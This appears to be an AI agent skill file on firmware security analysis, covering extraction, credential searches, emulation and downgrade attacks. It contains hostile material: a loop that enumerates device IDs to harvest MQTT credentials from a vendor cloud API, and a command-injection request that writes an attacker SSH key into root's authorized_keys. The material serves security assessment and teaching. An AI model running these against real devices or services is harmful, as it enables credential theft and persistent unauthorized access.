---
name: firmware-analysis
description: Analyze embedded device firmware for security vulnerabilities. Use this skill whenever the user needs to examine firmware images, extract filesystems, find hardcoded credentials, analyze binaries, or assess IoT device security. Trigger on mentions of firmware, embedded devices, IoT security, binary analysis, filesystem extraction, or hardware security assessment.
---

# Firmware Analysis Skill

A comprehensive guide for analyzing embedded device firmware to identify security vulnerabilities.

## When to Use This Skill

Use this skill when:
- You have a firmware binary and need to analyze it for vulnerabilities
- You need to extract filesystems from embedded device images
- You're investigating IoT device security
- You need to find hardcoded credentials or secrets in firmware
- You want to analyze compiled binaries for security issues
- You're assessing firmware update mechanisms for downgrade vulnerabilities
- You need to emulate firmware for dynamic analysis

## Workflow Overview

1. **Gather Information** - Understand the device architecture and components
2. **Acquire Firmware** - Obtain the firmware image through various methods
3. **Initial Analysis** - Identify file types, extract strings, check entropy
4. **Extract Filesystem** - Carve and extract the embedded filesystem
5. **Security Analysis** - Search for credentials, vulnerabilities, and weak configurations
6. **Binary Analysis** - Examine compiled binaries for exploitable issues
7. **Dynamic Analysis** - Emulate and test the firmware in a controlled environment

---

## 1. Information Gathering

Before deep analysis, collect intelligence about the device:

- CPU architecture (ARM, MIPS, x86, etc.)
- Operating system type
- Bootloader information
- Hardware layout and datasheets
- Available source code repositories
- External libraries and licenses
- Update history and version information
- Regulatory certifications (FCC, CE)

**OSINT Tools:**
- Coverity Scan for static analysis of open-source components
- LGTM for code quality and security issues
- Vendor support sites for documentation
- Google dork queries for firmware files

---

## 2. Firmware Acquisition Methods

### Direct Sources
- Manufacturer support websites
- Developer portals
- Building from source (if available)

### Indirect Sources
- Google dork queries: `filetype:bin firmware`, `filetype:bin firmware`, `inurl:firmware`
- Cloud storage scanning (S3Scanner for exposed buckets)
- Man-in-the-middle capture of update traffic
- Hardcoded update endpoints in device code

### Physical Extraction
- UART connection for boot logs and console access
- JTAG for memory dumping
- PICit for chip reading
- Direct chip removal and reading (last resort)

---

## 3. Initial Firmware Analysis

### Basic Inspection Commands

```bash
# Identify file type
file <firmware.bin>

# Extract printable strings (minimum 8 chars)
strings -n8 <firmware.bin>

# Extract strings with hex offsets
strings -tx <firmware.bin>

# View header (first 512 bytes)
hexdump -C -n 512 <firmware.bin> > hexdump.out

# Check for partition signatures
hexdump -C <firmware.bin> | head

# List partitions and filesystems
fdisk -lu <firmware.bin>

# Check entropy (encryption indicator)
binwalk -E <firmware.bin>
```

**Entropy Interpretation:**
- Low entropy: Likely not encrypted
- High entropy: Possibly encrypted or compressed

### Embedded File Extraction

```bash
# Extract embedded files
binwalk -e <firmware.bin>

# Extract and decompress
binwalk -eM <firmware.bin>

# Visual inspection
# Use binvis.io for file structure visualization
```

---

## 4. Filesystem Extraction

### Automatic Extraction with Binwalk

```bash
# Extract filesystem (creates directory based on type)
binwalk -ev <firmware.bin>
```

Common filesystem types: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs

### Manual Filesystem Carving

When binwalk doesn't recognize the filesystem:

```bash
# Find filesystem offset
binwalk <firmware.bin>

# Example output shows offset at 0x1A0094 (1704084 decimal)
# Carve the filesystem
dd if=<firmware.bin> bs=1 skip=1704084 of=extracted.squashfs

# Or using hex offset
dd if=<firmware.bin> bs=1 skip=$((0x1A0094)) of=extracted.squashfs
```

### Filesystem-Specific Extraction

**SquashFS:**
```bash
unsquashfs extracted.squashfs
# Files appear in squashfs-root/
```

**CPIO Archive:**
```bash
cpio -ivd --no-absolute-filenames -F <firmware.bin>
```

**JFFS2:**
```bash
jefferson rootfsfile.jffs2
```

**UBIFS (NAND flash):**
```bash
ubireader_extract_images -u UBI -s <start_offset> <firmware.bin>
ubidump.py <firmware.bin>
```

---

## 5. Security Analysis

### Credential Discovery

Check these locations for hardcoded credentials:

```bash
# User credentials
cat squashfs-root/etc/shadow
cat squashfs-root/etc/passwd

# SSL certificates and keys
find squashfs-root/etc/ssl -name "*.key" -o -name "*.pem"

# Configuration files with secrets
find squashfs-root -name "*.conf" -o -name "*.cfg" -o -name "*.ini"

# Search for common credential patterns
grep -r "password" squashfs-root/
grep -r "secret" squashfs-root/
grep -r "api_key" squashfs-root/
grep -r "token" squashfs-root/
```

### Automated Security Scanning

**LinPEAS** - Privilege escalation and sensitive info:
```bash
# Run in extracted filesystem
./linpeas.sh
```

**Firmwalker** - Firmware security analysis:
```bash
firmwalker -f <firmware.bin>
```

**FACT (Firmware Analysis and Comparison Tool):**
```bash
# Comprehensive firmware analysis
fact <firmware.bin>
```

**Other Tools:**
- FwAnalyzer - Static and dynamic analysis
- ByteSweep - Vulnerability scanning
- EMBA - Embedded malware analysis

### Binary Security Checks

**Unix Binaries (checksec.sh):**
```bash
checksec.sh --file=<binary>
# Checks: NX, PIE, RELRO, Stack Canary, FORTIFY_SOURCE
```

**Windows Binaries (PESecurity):**
```bash
PESecurity <binary.exe>
```

---

## 6. Cloud Configuration and MQTT Credential Harvesting

Many IoT devices derive cloud config tokens from device IDs using hardcoded secrets.

### Token Derivation Pattern

Common pattern: `token = MD5(deviceId || STATIC_KEY)`

```bash
# Derive token from device ID
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
echo "Token: $TOKEN"
```

### Cloud Config Harvesting

```bash
# Fetch cloud configuration
API_HOST="https://api.vendor.tld"
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .

# Extract MQTT credentials
jq '.mqtt.username, .mqtt.password, .mqtt.host'
```

### MQTT Access

```bash
# Subscribe to device topics
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

### Device ID Enumeration (Authorized Testing Only)

```bash
# Enumerate predictable device IDs
API_HOST="https://api.vendor.tld"
STATIC_KEY="cf50deadbeef"
PREFIX="d88b1603"  # OUI + product type

for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

**⚠️ Always obtain explicit authorization before enumeration.**

---

## 7. Firmware Emulation

### QEMU Setup

```bash
# Install QEMU emulation tools
sudo apt-get install qemu qemu-user qemu-user-static \
  qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

### Architecture Detection

```bash
# Check binary architecture
file squashfs-root/bin/busybox
# Output: ELF 32-bit LSB executable, MIPS, MIPS32...
```

### Running Emulated Binaries

**MIPS Big-Endian:**
```bash
qemu-mips <binary>
```

**MIPS Little-Endian:**
```bash
qemu-mipsel <binary>
```

**ARM:**
```bash
qemu-arm <binary>
```

### Full System Emulation

- **Firmadyne** - Automated firmware emulation
- **Firmware Analysis Toolkit** - Comprehensive emulation framework

---

## 8. Dynamic Analysis

### Runtime Analysis Tools

**GDB Multiarch:**
```bash
gdb-multiarch <binary>
# Set breakpoints, step through code, inspect memory
```

**Frida:**
```bash
# Dynamic instrumentation
frida -U -f <process> -l hook.js
```

**Ghidra:**
```bash
# Static and dynamic analysis
# Set breakpoints, trace execution, decompile
```

### Runtime Analysis Checklist

- [ ] Maintain shell access to emulated environment
- [ ] Test exposed web interfaces
- [ ] Analyze network services
- [ ] Check bootloader vulnerabilities
- [ ] Verify firmware integrity mechanisms
- [ ] Look for backdoor functionality

---

## 9. Firmware Downgrade Attacks

### Attack Vector

Many devices verify firmware signatures but don't check version numbers, allowing rollback to vulnerable versions.

### Attack Workflow

1. **Obtain older signed firmware**
   - Vendor download portals
   - Mobile app assets (APK extraction)
   - Third-party repositories

2. **Extract from mobile apps:**
```bash
apktool d vendor-app.apk -o vendor-app
ls vendor-app/assets/firmware/
```

3. **Upload via update endpoint**
   - Web UI
   - Mobile app API
   - TFTP, MQTT, USB

4. **Exploit patched vulnerabilities**
   - Command injection
   - Authentication bypass
   - Privilege escalation

### Example: Command Injection After Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

### Update Mechanism Checklist

- [ ] Transport security (TLS + authentication)
- [ ] Version comparison or anti-rollback counter
- [ ] Secure boot chain verification
- [ ] Userland sanity checks (partition map, model number)
- [ ] Consistent validation across all update flows

---

## 10. Practice Resources

### Vulnerable Firmware Projects

- **OWASP IoTGoat** - https://github.com/OWASP/IoTGoat
- **DVRF (Damn Vulnerable Router Firmware)** - https://github.com/praetorian-code/DVRF
- **DVAR (Damn Vulnerable ARM Router)** - https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html
- **ARM-X** - https://github.com/therealsaumil/armx
- **Azeria Labs VM 2.0** - https://azeria-labs.com/lab-vm-2-0/
- **DVID (Damn Vulnerable IoT Device)** - https://github.com/Vulcainreo/DVID

### Pre-configured Analysis Environments

- **AttifyOS** - https://github.com/adi0x90/attifyos
- **EmbedOS** - https://github.com/scriptingxss/EmbedOS

---

## Quick Reference Commands

```bash
# Initial analysis
file <bin>
strings -n8 <bin>
binwalk -E <bin>
binwalk -ev <bin>

# Filesystem extraction
dd if=<bin> bs=1 skip=<offset> of=fs.squashfs
unsquashfs fs.squashfs

# Credential search
grep -r "password\|secret\|api_key" squashfs-root/

# Binary analysis
checksec.sh --file=<binary>
file <binary>

# Emulation
qemu-mipsel <binary>
qemu-arm <binary>

# Token derivation
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

---

## Security Considerations

- Always work in isolated environments (VMs, containers)
- Obtain authorization before testing on devices you don't own
- Be aware of legal implications of firmware modification
- Document findings responsibly
- Report vulnerabilities to vendors through proper channels
- Never use this skill for unauthorized access or malicious activities
